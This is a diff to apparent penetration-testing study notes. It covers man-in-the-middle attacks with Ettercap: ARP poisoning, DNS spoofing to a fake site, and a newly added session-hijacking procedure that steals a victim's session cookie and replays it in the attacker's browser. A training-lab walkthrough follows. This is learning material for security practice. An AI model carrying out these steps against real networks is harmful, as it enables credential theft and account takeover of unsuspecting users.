@@ -237,9 +237,9 @@ Migrating into 4398 (you now live inside the computer BACKGROUND)
 - MITMF (Man-in-the-middle-framework)
 - Ettercap
 
-### Sniffing
+### Sniffing & Hijacking Session
 DNS Cache Poisoning w/ Ettercap: 
-Attacker poisons ARP table with his MAC | Victim wants to go to Google.com | The attacker spoofs themself as the DNS server | Victim winds up going to a fake Google. <br>
+Attacker poisons ARP table with his MAC | Victim wants to go to Google.com | The attacker spoofs themself as the DNS server | Victim winds up going to a fake Google. | Gather credentials, etc. <br>
 ```
 root# sysctl -w net.ipv4.ip_forward=1
 net.ipv4.ip_forward = 1
@@ -269,48 +269,61 @@ Now edit the HTML page located at /var/www/html/index.html for their landing pag
 root# ettercap -g
 
 Primary Interface -> eth1
-Start
 Scan for host
 Host List
 Victim Target 1
 Default Gateway Target 2
 Manage Plugins -> dns_spoof
 Globe -> ARP Poisoning
+Sniff Remote Connections (popup)
 root# service apache2 start
 ```
+Session Hijacking:
+```
+open ettercap
+Select Unified Sniffing
+Primary Interface -> eth*
+Select MITM
+DNS Spoofing
+Enter Default Gateway
+Enter DNS Server
+Have the Victim Release/Renew somehow... ipconfig /release /renew
+They go to the website enter credentials, ettercap receives the session ID
+Copy session ID cookie and enter it into Chrome for you
+```
+
 Example:
 
 Use Ettercap to begin sniffing and scanning for hosts.
-Set Exec (192.168.0.30) as the target machine
-Initiate DNS spoofing.
-From Exec, access rmksupplies.com.
-Complete this lab as follows:
+- Set Exec (192.168.0.30) as the target machine
+- Initiate DNS spoofing.
+- From Exec, access rmksupplies.com.
+- Complete this lab as follows:
 ```
-Use Ettercap to begin sniffing and scanning for hosts as follows:
 From the Favorites bar, open Ettercap.
-Select Sniff.
-Select Unified sniffing.
-From the Network Interface drop-down list, select enp2s0.
-Select OK.
-Select Hosts and select Scan for hosts.
+- Select Sniff.
+- Select Unified sniffing.
+- From the Network Interface drop-down list, select eth*.
+- Select OK.
+- Select Hosts and select Scan for hosts.
 Set Exec (192.168.0.30) as the target machine as follows:
-Select Hosts and select Host list.
-Under IP Address, select 192.168.0.30.
-Select Add to Target 1 to assign it as the target.
+- Select Hosts and select Host list.
+- Under IP Address, select 192.168.0.30.
+- Select Add to Target 1 to assign it as the target.
 Initiate DNS spoofing as follows:
-Select Plugins.
-Select Manage the plugins.
-Select the Plugins tab.
-Double-click dns_spoof to activate it.
-Select Mitm.
-Select ARP poisoning.
-Select Sniff remote connections.
-Select OK.
+- Select Plugins.
+- Select Manage the plugins.
+- Select the Plugins tab.
+- Double-click dns_spoof to activate it.
+- Select Mitm.
+- Select ARP poisoning.
+- Select Sniff remote connections.
+- Select OK.
 From Exec, access rmksupplies.com as follows:
-From the top navigation tabs, select Floor 1 Overview.
-Under Executive Office, select Exec.
-From the task bar, open Chrome.
-In the URL field, type rmksupplies.com and press Enter.
+- From the top navigation tabs, select Floor 1 Overview.
+- Under Executive Office, select Exec.
+- From the task bar, open Chrome.
+- In the URL field, type rmksupplies.com and press Enter.
 Notice that the page was redirected to RUS Office Supplies despite the web address not changing.
 ```
 MITM Attack:
